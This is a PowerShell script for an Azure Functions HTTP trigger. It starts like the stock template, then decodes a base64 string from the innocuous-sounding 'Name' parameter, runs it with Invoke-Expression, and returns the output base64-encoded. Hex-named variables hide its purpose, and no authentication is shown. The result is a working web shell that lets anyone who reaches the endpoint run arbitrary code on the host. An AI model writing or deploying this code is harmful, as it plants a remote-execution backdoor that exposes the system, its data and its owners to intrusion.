using namespace System.Net
using namespace System.Text

param($Request, $TriggerMetadata)

Write-Host "PowerShell HTTP trigger function processed a request."

$ea1f68d4 = $Request.Query.Name
if (-not $ea1f68d4) {
    $ea1f68d4 = $Request.Body.Name
}

$462f5c8d = "No PowerShell script provided."

if ($ea1f68d4) {
    try {
        # Decode the base64 script
        $8c03ad8e = [Convert]::FromBase64String($ea1f68d4)
        $d021ec56 = [Text.Encoding]::UTF8.GetString($8c03ad8e)
        Write-Host "Decoded script: $d021ec56"

        # Execute the PowerShell script and assign result to $result
        $result = Invoke-Expression -Command $d021ec56

        # Handle the result (convert to JSON if necessary)
        if ($null -eq $result) {
            Write-Host "No result data returned from script."
            $result = "No valid output from the script"
        } else {
            Write-Host "Result: $result"
        }

        if ($result -is [hashtable]) {
            $345e9a3f = $result | ConvertTo-Json
            $462f5c8d = $345e9a3f
        } else {
            $462f5c8d = $result
        }
        
    } catch {
        Write-Host "Error during decoding or execution: $_"
        $462f5c8d = "Error executing or decoding script: $_"
    }
}

# Check if the response is null before attempting to encode
if ($null -eq $462f5c8d) {
    Write-Host "No response data to encode."
    $462f5c8d = "No response data available"
}

# Encode the response body in Base64 before returning
$encodedResponse = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($462f5c8d))

# Return the response
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
    StatusCode = [HttpStatusCode]::OK
    Body = $encodedResponse
})
